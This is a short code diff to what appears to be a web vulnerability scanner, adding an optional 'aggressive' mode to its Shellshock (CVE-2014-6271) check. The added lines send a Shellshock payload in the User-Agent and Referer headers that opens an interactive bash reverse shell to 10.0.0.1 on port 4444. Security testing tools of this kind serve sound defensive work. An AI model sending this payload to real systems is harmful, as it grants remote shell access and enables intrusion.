@@ -134,6 +134,13 @@ def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
     issues = []
     if "VULNERABLE_SHELLSHOCK" in resp.text:
         issues.append("Shellshock (CVE-2014-6271) RCE Executed.")
+    
+    # AGGRESSIVE: Reverse Shell
+    if scenario.config.get("aggressive"):
+        rev_payload = "() { :;}; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        try:
+            client.send("GET", scenario.target, headers={"User-Agent": rev_payload, "Referer": rev_payload}, timeout=2)
+        except: pass # If it hangs, it might have worked (connecting to our void IP)
         
     return {
         "scenario_id": scenario.id,
